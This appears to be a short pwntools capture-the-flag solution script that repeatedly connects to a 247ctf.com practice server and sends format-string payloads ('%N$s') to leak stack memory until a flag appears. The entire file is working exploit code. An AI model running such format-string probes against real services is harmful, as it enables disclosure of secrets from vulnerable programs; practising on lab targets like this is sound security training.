#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'

for i in range(100):
	p = remote('3d9441ea1527f0cc.247ctf.com', 50269)
	try:
		p.sendlineafter('again?\n', '%'+str(i)+'$s')
		p.recvuntil('Welcome back ')
		r = p.recv()
		if '{' in r:
			print r
			break
		else:
			p.close()
	except:
		p.close()
